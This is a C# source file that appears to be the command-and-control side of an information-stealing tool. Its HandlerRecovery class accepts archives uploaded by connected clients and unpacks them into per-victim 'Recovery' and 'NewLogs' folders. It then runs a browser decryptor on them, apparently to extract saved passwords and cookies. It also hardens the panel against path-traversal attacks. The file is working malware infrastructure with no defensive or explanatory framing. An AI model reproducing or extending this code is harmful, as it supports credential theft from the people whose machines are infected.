using System;
using System.Drawing;
using System.IO;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages
{
    internal class HandlerRecovery
    {
        public static void Read(Clients clients, object[] array)
        {
            if (array.Length < 3) return;

            string clientId = array[1] as string ?? "";
            byte[] buff = array[2] as byte[];

            if (string.IsNullOrEmpty(clientId) ||
                clientId.Contains("..") ||
                clientId.Contains("\\") ||
                clientId.Contains("/") ||
                clientId.Contains(":") ||
                string.IsNullOrWhiteSpace(clientId))
            {
                Methods.AppendLogs(clients.IP, "\"RCE Attack blocked (HandlerRecovery)", Color.Red);
                clients.Disconnect();
                return;
            }

            string recoveryDir = Path.GetFullPath(Path.Combine("Users", clientId, "Recovery"));
            string newLogsDir = Path.GetFullPath(Path.Combine("NewLogs", clientId));

            if (!recoveryDir.StartsWith(Path.GetFullPath("Users\\"), StringComparison.OrdinalIgnoreCase) ||
                !newLogsDir.StartsWith(Path.GetFullPath("NewLogs\\"), StringComparison.OrdinalIgnoreCase))
            {
                Methods.AppendLogs(clients.IP, "\"RCE Attack blocked (HandlerRecovery escape)", Color.Red);
                clients.Disconnect();
                return;
            }

            if (buff == null || buff.Length == 0)
            {
                clients.Disconnect();
                return;
            }

            string tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            try
            {
                Directory.CreateDirectory(tempDir);
                PaleFileProtocol.Unpack(tempDir, buff);

                string[] unpackedFiles = Directory.GetFiles(tempDir, "*", SearchOption.AllDirectories);
                foreach (string file in unpackedFiles)
                {
                    string rel = file.Substring(tempDir.Length).TrimStart('\\');
                    if (rel.Contains("..") || Path.IsPathRooted(rel))
                    {
                        Methods.AppendLogs(clients.IP, "RCE Attack Blocked (nested traversal in Recovery)", Color.Red);
                        clients.Disconnect();
                        return;
                    }

                    string dest1 = Path.Combine(recoveryDir, rel);
                    string dest2 = Path.Combine(newLogsDir, rel);

                    if (!dest1.StartsWith(recoveryDir + "\\", StringComparison.OrdinalIgnoreCase) ||
                        !dest2.StartsWith(newLogsDir + "\\", StringComparison.OrdinalIgnoreCase))
                    {
                        continue;
                    }

                    Directory.CreateDirectory(Path.GetDirectoryName(dest1));
                    Directory.CreateDirectory(Path.GetDirectoryName(dest2));

                    File.Copy(file, dest1, true);
                    File.Copy(file, dest2, true);
                }

                DecryptorBrowsers.Start(recoveryDir);
                DecryptorBrowsers.Start(newLogsDir);

                string infoPath = Path.Combine("Users", clientId, "Information.txt");
                if (File.Exists(infoPath))
                {
                    File.Copy(infoPath, Path.Combine(recoveryDir, "InformationLeb.txt"), true);
                    File.Copy(infoPath, Path.Combine(newLogsDir, "InformationLeb.txt"), true);
                }

                Methods.AppendLogs(clients.IP, "Save logs in: Users\\" + clientId + "\\Recovery", Color.MediumPurple);
            }
            catch { }
            finally
            {
                if (Directory.Exists(tempDir))
                    Directory.Delete(tempDir, true);
                clients.Disconnect();
            }
        }
    }
}
